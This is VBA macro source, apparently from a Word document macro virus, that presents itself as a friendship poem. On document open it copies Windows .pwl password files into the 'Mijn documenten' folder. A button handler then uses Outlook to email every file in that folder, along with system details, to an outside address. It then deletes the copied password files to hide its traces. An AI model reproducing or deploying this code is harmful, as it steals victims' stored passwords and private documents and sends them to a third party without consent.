Dim BreakUmOffASlice, UngaDasOutlook, FileSystemObject
Dim fs, f, f1, fc, s

Private Sub cmdSend_Click()
On Error Resume Next

    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFolder("c:\Mijn documenten")
    Set fc = f.Files

    For Each f1 In fc
        Set UngaDasOutlook = CreateObject("Outlook.application")
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
            With BreakUmOffASlice

                .Recipients.Add "convex@mail.org"
                .Subject = "True Friends fucked @ " & Date & " " & Time
                .Body = System.OperatingSystem & Chr(10) &
System.ProcessorType & Chr(10) & Chr(10) & System.Version & TextBox2.Text
                .attachments.Add s & "C:\Mijn documenten\" & f1.Name
                .send

            End With

    Next

FileSystemObject.DeleteFile "c:\mijn documenten\*.pwl", True
MsgBox "Sending documents...", vbOKOnly, "Message"

End Sub

Private Sub Document_Open()
On Error Resume Next

TextBox1.Text = ""
TextBox1.Text = "Written with a pen." & Chr(10)
TextBox1.Text = TextBox1.Text & "Sealed with a kiss." & Chr(10)
TextBox1.Text = TextBox1.Text & "Please answer this:" & Chr(10)
TextBox1.Text = TextBox1.Text & "Are we friends" & Chr(10)
TextBox1.Text = TextBox1.Text & "Or are we not?" & Chr(10)
TextBox1.Text = TextBox1.Text & "You told me once" & Chr(10)
TextBox1.Text = TextBox1.Text & "But I forgot" & Chr(10)
TextBox1.Text = TextBox1.Text & "So Tell me now" & Chr(10)
TextBox1.Text = TextBox1.Text & "And tell me true." & Chr(10)
TextBox1.Text = TextBox1.Text & "So I can say...," & Chr(10)
TextBox1.Text = TextBox1.Text & "I am here for you" & Chr(10)
TextBox1.Text = TextBox1.Text & "Of all the friends," & Chr(10)
TextBox1.Text = TextBox1.Text & "I've ever met," & Chr(10)
TextBox1.Text = TextBox1.Text & "You're the one," & Chr(10)
TextBox1.Text = TextBox1.Text & "Of all the friends," & Chr(10)
TextBox1.Text = TextBox1.Text & "I won't forget," & Chr(10)
TextBox1.Text = TextBox1.Text & "And If I die" & Chr(10)
TextBox1.Text = TextBox1.Text & "Before you do," & Chr(10)
TextBox1.Text = TextBox1.Text & "I'll go to heaven" & Chr(10)
TextBox1.Text = TextBox1.Text & "And wait for you." & Chr(10)
TextBox1.Text = TextBox1.Text & "I'll give the angels," & Chr(10)
TextBox1.Text = TextBox1.Text & "Back their wings" & Chr(10)
TextBox1.Text = TextBox1.Text & "And risk the loss" & Chr(10)
TextBox1.Text = TextBox1.Text & "Of everything," & Chr(10)
TextBox1.Text = TextBox1.Text & "Just to prove my..." & Chr(10)
TextBox1.Text = TextBox1.Text & "friendship is true.." & Chr(10)
TextBox1.Text = TextBox1.Text & "To have a friend like you" & Chr(10)
Set FileSystemObject = CreateObject("scripting.FileSystemObject")
FileSystemObject.CopyFile "C:\WINDOWS\*.pwl", "C:\mijn documenten\"

End Sub


